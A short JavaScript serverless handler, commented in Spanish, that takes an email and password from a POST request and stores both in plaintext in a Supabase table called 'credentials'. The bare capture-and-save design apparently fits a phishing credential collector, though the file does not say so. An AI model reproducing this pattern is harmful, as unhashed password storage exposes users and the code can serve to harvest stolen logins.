import { createClient } from '@supabase/supabase-js';

export default async function handler(req, res) {
  // Solo POST
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Método no permitido' });
  }

  try {
    const { email, password } = req.body;

    // Validar datos
    if (!email || !password) {
      return res.status(400).json({ message: 'Email y contraseña requeridos' });
    }

    // Obtener variables de entorno
    const supabaseUrl = process.env.SUPABASE_URL;
    const supabaseKey = process.env.SUPABASE_KEY;

    if (!supabaseUrl || !supabaseKey) {
      console.error('Variables de entorno faltantes');
      return res.status(500).json({ message: 'Error de configuración del servidor' });
    }

    // Crear cliente de Supabase
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Insertar en base de datos
    const { data, error } = await supabase
      .from('credentials')
      .insert([{ email, password }]);

    if (error) {
      console.error('Error de Supabase:', error);
      return res.status(500).json({ message: `Error: ${error.message}` });
    }

    return res.status(200).json({ message: 'Credenciales guardadas exitosamente' });

  } catch (error) {
    console.error('Error en API:', error);
    return res.status(500).json({ message: `Error: ${error.message}` });
  }
}
